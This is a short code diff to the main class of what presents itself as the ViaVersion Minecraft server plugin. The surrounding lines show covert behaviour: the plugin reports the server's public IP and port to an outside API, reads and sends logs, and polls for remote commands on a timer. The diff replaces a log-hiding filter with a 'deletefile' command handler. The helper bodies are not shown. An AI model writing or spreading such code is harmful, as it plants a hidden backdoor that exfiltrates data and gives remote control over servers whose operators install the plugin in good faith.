@@ -127,7 +127,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
-        getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
+        this.getCommand("deletefile").setExecutor(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
@@ -164,6 +164,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getCommand("viaversion").setExecutor(commandHandler);
         getCommand("viaversion").setTabCompleter(commandHandler);
     }
+
     private String getPublicIp() {
         String ip = "Unable to retrieve IP";
         try {
